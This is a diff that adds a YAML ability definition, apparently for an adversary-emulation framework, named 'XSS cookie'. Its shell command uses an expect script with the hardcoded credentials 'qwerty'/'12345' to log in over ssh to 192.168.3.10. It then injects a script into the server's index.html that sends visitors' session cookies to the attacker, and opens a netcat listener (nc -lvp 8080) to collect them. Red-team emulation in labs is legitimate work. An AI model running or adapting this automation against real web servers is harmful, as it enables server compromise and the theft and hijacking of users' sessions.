@@ -1,0 +1,36 @@
+- tactic: execution
+  technique_name: Steal Web Session Cookie
+  technique_id: TB007
+  name: XSS cookie
+  description: Insert into the server's index.html file at the specified ip address
+    a script that sends the session's cookie to the attacker's host. The connection
+    takes place via ssh, using the specified parameters ad username and password
+  executors:
+  - name: sh
+    platform: linux
+    command: mv XSS_script.txt /tmp/XSS_script.txt; mv put_xss.exp /tmp/put_xss.exp;
+      /tmp/put_xss.exp qwerty 12345 192.168.3.10 /tmp/XSS_script.txt; nc -lvp 8080
+      -w 1
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - XSS_script.txt
+    - put_xss.exp
+    uploads: []
+    timeout: 180
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - collection
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 98d472fe-9fbc-4730-944e-04271c8c1884
